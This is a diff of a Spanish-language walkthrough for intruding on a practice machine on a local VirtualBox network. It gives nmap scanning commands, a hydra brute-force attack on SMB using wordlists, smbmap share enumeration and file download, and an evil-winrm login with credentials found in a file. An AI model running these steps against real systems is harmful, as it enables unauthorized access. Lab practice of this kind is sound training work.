@@ -1,17 +1,25 @@
 User.txt
 
-Hydra al smb:
-hydra -L user.txt -P pass.txt IP smb
+Empezamos verificando que se ha creado una interfaz de red llamada vboxnet0:
+    - ifconfig
 
-Ver carpetas compartidas:
-smbmap -H IP -u user -p pass
-smbmap -H IP -u user -p pass -r folder
+Empezamos escaneado la red con nmap:
+    - Descubrir cuantos hosts hay -> nmap 192.168.56.0/24 -sn -T5
+    - Escaneado de todos los puertos -> nmap -p- -sS --min-rate 5000 --open -vvv IP -oN ports 
+    - Escaneo en profundidad de los puertos abiertos -> nmap -p(lista de puestos) -sCV --min-rate 5000 IP (Ej: nmap -p22,80 -sCV --min-rate 5000 IP )
+ 
+ En el nmap, vemos que el servicio winrm esta abierto. Esto puee ser interesante mas adelante.
+
+Vemos que el servicio smb esta abierto. Probamos hacer un ataque de fuerza bruta a este servicio:
+    - Utilizar los siguientes diccionarios -> ./diccionarios/names.txt y ./diccionarios/passwords.txt 
+
+    - hydra -L names.txt -P passwords.txt IP smb
 
 Descargar archivo:
-smbmap -H IP -u user -p pass --download path/file
+    - smbmap -H IP -u user -p pass --download path/file
 
-Conectar por winrm:
-evil-winrm -i IP -u user -p pass
+En el archivo vemos un usuario y contraseña.  Probamos a conectarnos por el servicio winrm:
+    - evil-winrm -i IP -u user -p pass
+Nos deja conectarnos, esto quiere decir que el usuario esta en el grupo: Remote Management Users
 
-pero para hacerlo mas facil, se ha habilitado el rdesktop:
-rdesktop -u 'username' -p 'pass' IP
+Esta es la intrusion, pero para que la escalada de privilegios sea mas comoda, nos conectamos con rdekstop. 
